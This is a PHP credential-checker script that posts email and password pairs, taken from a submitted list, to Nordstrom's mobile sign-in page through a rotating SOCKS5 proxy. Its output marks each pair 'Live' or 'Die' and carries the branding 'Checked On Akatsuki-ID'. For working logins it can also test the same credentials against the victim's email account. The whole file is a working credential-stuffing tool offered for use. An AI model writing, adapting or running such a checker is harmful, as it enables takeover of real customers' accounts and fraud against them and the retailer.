<?php
require ('../nordstrom/class_mail.php');
require ('../nordstrom/class_curl.php');

function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}
if ($_POST['do'] == 'check')
{
    
    $mail = new Mail();
    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0');
   
    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
    $sock = urldecode($_POST['sock']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
    $curl->sock5($sock);
    $curl->page("http://m.nordstrom.com/Category/makeup-shop");
    $curl->page("https://msecure.nordstrom.com/Account/SignIn?origin=login&ReturnUrl=http%3a%2f%2fm.nordstrom.com%2fCategory%2fmakeup-shop");
    if($curl->validate()){
    $fullink="https://msecure.nordstrom.com/Account/SignIn";
    $var="EmailAddress=$email&Password=$pwd&returnUrl=http%3A%2F%2Fm.nordstrom.com%2FCategory%2Fmakeup-shop&ExpressCheckout=False&IsEarlyAccess=False&IsDressingRoom=False&IsRemindMeToReorder=False&IsRedirectedFromWishList=False";
    $curl->postdata($var);
    $curl->page($fullink);
        if ($curl->validate()) {
            if (stripos($curl->content, "The email address and/or password could not be found.") !== false) {
                $result["error"] = 2;
                $result["msg"] = "<b style=\"color:red;\">Die</b> => " . $sock . " | " . $email . " | " . $pwd . " | Checked On Akatsuki-ID";
            } elseif (stripos($curl->content, "Please enter a valid e-mail address and password combination.") !== false) {
                $result["error"] = 2;
                $result["msg"] = "<b style=\"color:red;\">Die</b> => " . $sock . " | " . $email . " | " . $pwd . " | Checked On Akatsuki-ID";
                } elseif (stripos($curl->content, "Sign Out") !== false) {
                    if ($_POST["email"]) {
                        $cmail = new checkmail;
                        $fmail = $cmail->getmail("", $email, $pwd, $sock);
                        $fmail = "" . $fmail;
                    }
                    $result["error"] = 0;
                    $result["msg"] = "<b style=\"color:yellow;\">Live</b> => " . $sock . " | " . $email . " | " . $pwd . " Checked On Akatsuki-ID";

                    } else {

                        $result["error"] = -1;
                        $result["msg"] = "<b style=\"color:White;\" > Wrong Format < / b > => ".$sock." | ".$email." | ".$pwd." | Checked On Akatsuki-ID";
}
        }
        else{
    
    
        $result['error'] = 1;
        $result['msg'] = $sock . ' => Socks Die/Timeout';
    
        }   
        
    
    
    }else{
    
    
        $result['error'] = 1;
        $result['msg'] = $sock . ' => Socks Die/Timeout';
    
    }
    
    

    echo json_encode($result);
    exit;

}

?>